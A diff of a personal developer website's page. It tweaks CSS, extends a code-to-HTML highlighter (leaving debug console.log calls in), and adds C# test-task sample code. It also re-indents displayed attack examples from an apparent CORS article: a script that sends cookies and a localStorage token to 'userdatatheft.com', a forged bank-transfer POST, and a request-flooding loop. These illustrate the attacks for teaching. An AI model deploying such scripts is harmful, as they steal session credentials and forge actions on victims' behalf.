@@ -268,14 +268,14 @@
         h2 {
             font-weight: bold;
             font-size: 1.5rem;
-            margin-top: 0.5rem;
-            margin-bottom: 0;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
         }
 
         h3 {
             font-weight: bold;
             font-size: 1.2rem;
-            margin-top: 0.5rem;
+            margin-top: 1rem;
             margin-bottom: 0.3rem;
         }
 
@@ -334,8 +334,12 @@
                 padding: 5px;
                 border: solid 1px #dddddd;
                 overflow: auto;
-                max-height: 240px;
             }
+
+                code.code-block.sized {
+                    min-height: 200px;
+                    max-height: 200px;
+                }
 
             code.html .tag {
                 color: #800009;
@@ -489,11 +493,6 @@
             margin-bottom: 1rem;
         }
 
-        .sub-title {
-            margin-bottom: 1rem;
-            margin-top: 2rem;
-        }
-
         .img-container-v {
             text-align: center;
         }
@@ -517,8 +516,12 @@
             text-align: left;
         }
 
-            .block .title, .block .sub-title {
+            .block h1, .block h2 {
                 text-align: center;
+            }
+
+            .block h3 {
+                text-align: left;
             }
 
         .container {
@@ -905,9 +908,9 @@
                 <div class="block">
                     <div class="title"><h1>What's new?</h1></div>
                     <div>
+                        <p><span>Article: Test task & Performance optimization </span><a href="?section=article-tt-po" onclick="UI.navigate('article-tt-po'); return false;">published</a></p>
                         <p><span>Code: Source code to HTML convertor beta </span><a href="?section=code-to-html" onclick="UI.navigate('code-to-html'); return false;">released</a></p>
                         <p><span>Photos: Beautiful moments </span><a href="?section=photos-moments" onclick="UI.navigate('photos-moments'); return false;">updated</a></p>
-                        <p><span>Article: CORS </span><a href="?section=article-cors" onclick="UI.navigate('article-cors'); return false;">published</a></p>
                     </div>
                 </div>
                 <div class="block">
@@ -1261,11 +1264,11 @@
                                         <span>
                                             <code class="code-block html js">
                                                 <span class="line"><span class="tag-brace">&lt;</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="method">setInterval</span><span class="special-char">(</span><span class="special-char">(</span><span class="special-char">)</span> <span class="special-char">=</span><span class="special-char">></span> <span class="special-char">{</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">open</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>POST<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>https://attackablesite.com/contactme<span class="special-char">'</span></span><span class="special-char">,</span> <span class="decl">true</span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">send</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>subject=Your+site+is+down<span class="special-char">'</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="special-char">}</span><span class="special-char">,</span> <span class="normal">1000</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="method">setInterval</span><span class="special-char">(</span><span class="special-char">(</span><span class="special-char">)</span> <span class="special-char">=</span><span class="special-char">></span> <span class="special-char">{</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">open</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>POST<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>https://attackablesite.com/contactme<span class="special-char">'</span></span><span class="special-char">,</span> <span class="decl">true</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">send</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>subject=Your+site+is+down<span class="special-char">'</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span><span class="special-char">,</span> <span class="normal">1000</span><span class="special-char">)</span><span class="special-char">;</span></span>
                                                 <br /><span class="line"><span class="tag-brace">&lt;/</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                             </code>
                                         </span>
@@ -1286,9 +1289,9 @@
                                         <span>
                                             <code class="code-block html js">
                                                 <span class="line"><span class="tag-brace">&lt;</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">open</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>POST<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>https://somenotsafeuserbank.com/transfers<span class="special-char">'</span></span><span class="special-char">,</span> <span class="decl">true</span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">send</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>receivingaccount=malicious&amount=100<span class="special-char">'</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">open</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>POST<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>https://somenotsafeuserbank.com/transfers<span class="special-char">'</span></span><span class="special-char">,</span> <span class="decl">true</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">send</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>receivingaccount=malicious&amount=100<span class="special-char">'</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
                                                 <br /><span class="line"><span class="tag-brace">&lt;/</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                             </code>
                                         </span>
@@ -1311,9 +1314,9 @@
                                         <span>
                                             <code class="code-block html js">
                                                 <span class="line"><span class="tag-brace">&lt;</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">open</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>POST<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>https://userdatatheft.com/<span class="special-char">'</span></span><span class="special-char">,</span> <span class="decl">true</span><span class="special-char">)</span><span class="special-char">;</span></span>
-                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">send</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>cookie=<span class="special-char">'</span></span> <span class="special-char">+</span> <span class="normal">document</span><span class="special-char">.</span><span class="normal">cookie</span> <span class="special-char">+</span> <span class="string"><span class="special-char">'</span>&token=<span class="special-char">'</span></span> <span class="special-char">+</span> <span class="normal">window</span><span class="special-char">.</span><span class="normal">localStorage</span><span class="special-char">.</span><span class="method">getItem</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>token<span class="special-char">'</span></span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">open</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>POST<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>https://userdatatheft.com/<span class="special-char">'</span></span><span class="special-char">,</span> <span class="decl">true</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span><span class="special-char">.</span><span class="method">send</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>cookie=<span class="special-char">'</span></span> <span class="special-char">+</span> <span class="normal">document</span><span class="special-char">.</span><span class="normal">cookie</span> <span class="special-char">+</span> <span class="string"><span class="special-char">'</span>&token=<span class="special-char">'</span></span> <span class="special-char">+</span> <span class="normal">window</span><span class="special-char">.</span><span class="normal">localStorage</span><span class="special-char">.</span><span class="method">getItem</span><span class="special-char">(</span><span class="string"><span class="special-char">'</span>token<span class="special-char">'</span></span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
                                                 <br /><span class="line"><span class="tag-brace">&lt;/</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                             </code>
                                         </span>
@@ -1414,6 +1417,7 @@
                                         let lineContentStarted = false;
                                         let stringLiteralQuote = '';
                                         let stringLiteral = false;
+                                        let stringInterpolation = false;
                                         let lineComment = false;
                                         let lexeme = '';
                                         for (let i = 0; i < line.length; i++) {
@@ -1482,16 +1486,29 @@
                                                 continue;
                                             }
 
-                                            if ((_lang.quotes.indexOf(ch) >= 0)) {
+                                            if ((_lang.quotes.indexOf(ch) >= 0) || (ch === _lang.interpolation)) {
                                                 if (!stringLiteral) {
-                                                    stringLiteral = true;
-                                                    stringLiteralQuote = ch;
-
-                                                    resultLine += _getOpeningTag(_options.stringCss);
-                                                    resultLine += _getContentTag(_options.specialCharCss, ch);
+                                                    if ((ch === _lang.interpolation) && (i < line.length - 1)) {
+                                                        const nextCh = line[i + 1];
+                                                        if (_lang.quotes.indexOf(nextCh) >= 0) {
+                                                            stringLiteral = true;
+                                                            stringInterpolation = true;
+                                                            stringLiteralQuote = nextCh;
+                                                            resultLine += _getOpeningTag(_options.stringCss);
+                                                            resultLine += _getContentTag(_options.specialCharCss, ch + nextCh);
+                                                            i++;
+                                                        }
+                                                    }
+                                                    else if (_lang.quotes.indexOf(ch) >= 0) {
+                                                        stringLiteral = true;
+                                                        stringLiteralQuote = ch;
+                                                        resultLine += _getOpeningTag(_options.stringCss);
+                                                        resultLine += _getContentTag(_options.specialCharCss, ch);
+                                                    }
                                                 }
                                                 else if (stringLiteralQuote === ch) {
                                                     stringLiteral = false;
+                                                    stringInterpolation = false;
 
                                                     resultLine += _getContentTag(_options.specialCharCss, ch);
                                                     resultLine += _getClosingTag();
@@ -1501,6 +1518,7 @@
                                                 }
                                             }
                                             else if (!stringLiteral) {
+                                                console.log('xx', ch);
                                                 if ((_lang.separators.indexOf(ch) >= 0) || (_lang.spaces.indexOf(ch) >= 0)) {
                                                     const nextNonSpaceCh = _getNextNonSpace(line, i);
                                                     const prevNonSpaceCh = _getPrevNonSpace(line, i - lexeme.length);
@@ -1512,6 +1530,7 @@
                                                     else {
                                                         resultLine += _getContentTag(_options.specialCharCss, _escapeChar(ch));
                                                     }
+                                                    console.log('xx2', ch);
 
                                                     if (lexeme) {
                                                         prevLexeme = lexeme;
@@ -1522,12 +1541,27 @@
                                                     lexeme += ch;
                                                 }
 
-                                                if (_lang.braces.indexOf(ch) >= 0) {
+                                                if (stringInterpolation && (_lang.interpolationBraces.indexOf(ch) >= 0)) {
+                                                    resultLine += _getOpeningTag(_options.stringCss);
+                                                    console.log('stringLiteral = true', ch);
+                                                    stringLiteral = true;
+
+                                                    prevLexeme = '';
+                                                }
+                                                else if (_lang.braces.indexOf(ch) >= 0) {
                                                     prevLexeme = '';
                                                 }
                                             }
                                             else if (stringLiteral) {
-                                                resultLine += _escapeChar(ch);
+                                                if (stringInterpolation && (_lang.interpolationBraces.indexOf(ch) >= 0)) {
+                                                    resultLine += _getClosingTag();
+                                                    resultLine += _getContentTag(_options.specialCharCss, ch);
+                                                    console.log('stringLiteral = false', ch);
+                                                    stringLiteral = false;
+                                                }
+                                                else {
+                                                    resultLine += _escapeChar(ch);
+                                                }
                                             }
                                         }
 
@@ -1562,7 +1596,7 @@
 
                                 function _initOptions(lang, options) {
                                     let result = {
-                                        codeCss: 'code-block html ' + lang,
+                                        codeCss: 'code-block ' + lang,
                                         tagCss: 'tag',
                                         tagBraceCss: 'tag-brace',
                                         declarationCss: 'decl',
@@ -1638,7 +1672,7 @@
                                 function _getLang(lang) {
                                     if (lang === 'js')
                                         return {
-                                            separators: ['.', ',', ';', ':', '!', '&', '|', '-', '+', '*', '/', '=', '>', '<', '{', '}', '(', ')', '[', ']'],
+                                            separators: ['.', ',', ';', ':', '!', '&', '|', '-', '+', '*', '/', '%', '=', '>', '<', '{', '}', '(', ')', '[', ']'],
                                             quotes: ['\'', '"'],
                                             spaces: [' ', '\t'],
                                             esc: ['\\'],
@@ -1654,8 +1688,10 @@
                                         };
                                     if (lang == 'csharp') {
                                         return {
-                                            separators: ['.', ',', ';', ':', '!', '&', '|', '-', '+', '*', '/', '=', '>', '<', '{', '}', '(', ')', '[', ']'],
+                                            separators: ['.', ',', ';', ':', '!', '&', '$', '|', '-', '+', '*', '/', '%', '=', '>', '<', '{', '}', '(', ')', '[', ']'],
                                             quotes: ['\'', '"'],
+                                            interpolation: '$',
+                                            interpolationBraces: ['{', '}'],
                                             spaces: [' ', '\t'],
                                             esc: ['\\'],
                                             braces: ['{', '}'],
@@ -1675,7 +1711,7 @@
                                     }
 
                                     return {
-                                        separators: ['.', ',', ';', ':', '!', '&', '|', '-', '+', '*', '/', '=', '>', '<', '{', '}', '(', ')', '[', ']'],
+                                        separators: ['.', ',', ';', ':', '!', '&', '|', '-', '+', '*', '/', '%', '=', '>', '<', '{', '}', '(', ')', '[', ']'],
                                         quotes: ['\'', '"'],
                                         spaces: [' ', '\t'],
                                         esc: ['\\'],
@@ -1829,6 +1865,7 @@
                             initialIndent: parseInt(document.getElementById('code-to-html-indent-init').value),
                             inputIndentSize: parseInt(document.getElementById('code-to-html-indent-input').value),
                             outputIndentSize: parseInt(document.getElementById('code-to-html-indent-output').value),
+                            codeCss: 'code-block sized ' + lang
                         }
                         const html = Code2Html.create(lang, options).convert(code);
                         document.getElementById('code-to-html-html').value = html;
@@ -1836,8 +1873,12 @@
                     }
 
                     function Code2HtmlShowSelfCode() {
+                        const options = {
+                            codeCss: 'code-block sized js'
+                        };
+
                         const code = document.getElementById('code-to-html-script').innerHTML;
-                        const html = Code2Html.create('js').convert(code);
+                        const html = Code2Html.create('js', options).convert(code);
                         document.getElementById('code-to-html-self').innerHTML = html;
                     }
 
@@ -1858,18 +1899,18 @@
                         <div class="title"><h1>The playground</h1></div>
                         <p><label for="code-to-html-src">Code to convert:</label><textarea id="code-to-html-src" style="resize:vertical;height:160px;"></textarea></p>
                         <p>
-                            <span class="field"> <label for="code-to-html-lang">Language:</label><select id="code-to-html-lang" style="width: 4rem;"><option value="js">JS</option><option value="csharp">C#</option></select></span>
+                            <span class="field"> <label for="code-to-html-lang">Language:</label><select id="code-to-html-lang" style="width: 4rem;"><option value="js">JS</option><option value="csharp" selected>C#</option></select></span>
                             <br /><span class="field"><label for="code-to-html-indent-init">Initial indent:</label><input type="number" id="code-to-html-indent-init" style="width: 4rem" value="0" /></span>
                             <br /><span class="field"><label for="code-to-html-indent-input">Input indent:</label><input type="number" id="code-to-html-indent-input" style="width: 4rem" value="4" /></span>
-                            <br /><span class="field"><label for="code-to-html-indent-output">Output indent:</label><input type="number" id="code-to-html-indent-output" style="width: 4rem" value="2" /></span>
+                            <br /><span class="field"><label for="code-to-html-indent-output">Output indent:</label><input type="number" id="code-to-html-indent-output" style="width: 4rem" value="4" /></span>
                         </p>
                         <p><span><button class="color-1" onclick="Code2HtmlRun()">Convert</button></span></p>
-                        <p><label>Preview:</label><span id="code-to-html-preview"><code class="code-block" style="min-height:60px"></code></span></p>
+                        <p><label>Preview:</label><span id="code-to-html-preview"><code class="code-block sized"></code></span></p>
                         <p><label for="code-to-html-html">Html:</label><textarea id="code-to-html-html" style="resize:vertical;height:80px;"></textarea></p>
                     </div>
                     <div class="block">
                         <div class="title"><h1>The convertor code</h1></div>
-                        <div><p><span id="code-to-html-self"><code class="code-block" style="min-height:60px"></code></span></p></div>
+                        <div><p><span id="code-to-html-self"><code class="code-block sized"></code></span></p></div>
                         <div><p><a href="https://github.com/yuskithedeveloper/snippets/blob/main/JS/Code2Html.js" target="_blank">Github</a></p></div>
                     </div>
                 </div>
@@ -1924,7 +1965,45 @@
                                     </i>
                                 </span>
                             </p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">internal</span> <span class="decl">class</span> <span class="class">Program</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">static</span> <span class="decl">void</span> <span class="method">Main</span><span class="special-char">(</span><span class="decl">string</span><span class="special-char">[</span><span class="special-char">]</span> <span class="normal">args</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">input</span> <span class="special-char">=</span> <span class="string"><span class="special-char">"</span>Separate a string input into words. A string input into words. Words.<span class="special-char">"</span></span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">Console</span><span class="special-char">.</span><span class="method">WriteLine</span><span class="special-char">(</span><span class="normal">input</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">output</span> <span class="special-char">=</span> <span class="method">RunTestTask</span><span class="special-char">(</span><span class="normal">input</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">Console</span><span class="special-char">.</span><span class="method">WriteLine</span><span class="special-char">(</span><span class="normal">output</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">Console</span><span class="special-char">.</span><span class="method">ReadKey</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="decl">static</span> <span class="decl">string</span> <span class="method">RunTestTask</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">separators</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="decl">char</span><span class="special-char">[</span><span class="special-char">]</span> <span class="special-char">{</span> <span class="string"><span class="special-char">'</span>.<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>,<span class="special-char">'</span></span> <span class="special-char">}</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">words</span> <span class="special-char">=</span> <span class="normal">input</span><span class="special-char">.</span><span class="method">Split</span><span class="special-char">(</span><span class="normal">separators</span><span class="special-char">,</span> <span class="class">StringSplitOptions</span><span class="special-char">.</span><span class="normal">RemoveEmptyEntries</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">resultWords</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">word</span> <span class="normal">in</span> <span class="normal">words</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">%</span> <span class="normal">2</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="special-char">!</span><span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="method">Reverse</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToArray</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="class">String</span><span class="special-char">.</span><span class="method">Join</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span> <span class="special-char">"</span></span><span class="special-char">,</span> <span class="normal">resultWords</span><span class="special-char">.</span><span class="method">OrderBy</span><span class="special-char">(</span><span class="normal">x</span> <span class="special-char">=</span><span class="special-char">&gt;</span> <span class="normal">x</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
                             <p><span>Sure, this is not the code task authors are expecting. But it works, so I'll use it as a self-test for further implementations.</span></p>
                             <p class="sub-title"><h3>Doubts and thoughts:</h3></p>
                             <ul>
@@ -1948,8 +2027,85 @@
                                 </li>
                             </ul>
                             <p><span>Obviously, I need a much longer string to measure the performance. And self-tests. And performance comparisons. <i>And Program.cs is not the right place...</i></span></p>
-                            <p><span><code class="code-block"></code></span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">internal</span> <span class="decl">class</span> <span class="class">Program</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">static</span> <span class="decl">void</span> <span class="method">Main</span><span class="special-char">(</span><span class="decl">string</span><span class="special-char">[</span><span class="special-char">]</span> <span class="normal">args</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="decl">string</span> <span class="normal">selfTestIn</span> <span class="special-char">=</span> <span class="string"><span class="special-char">"</span>Separate a string input into words. A string input into words.<span class="special-char">"</span></span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="decl">string</span> <span class="normal">selfTestOutExpected</span> <span class="special-char">=</span> <span class="string"><span class="special-char">"</span>a a into tupni sdrow tupni sdrow string separate<span class="special-char">"</span></span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">bigIn</span> <span class="special-char">=</span> <span class="normal">File</span><span class="special-char">.</span><span class="method">ReadAllText</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span>C:<span class="escape"><span class="special-char">\\</span></span>Users<span class="escape"><span class="special-char">\\</span></span>-<span class="escape"><span class="special-char">\\</span></span>Downloads<span class="escape"><span class="special-char">\\</span></span>WarAndPeace.txt<span class="special-char">"</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
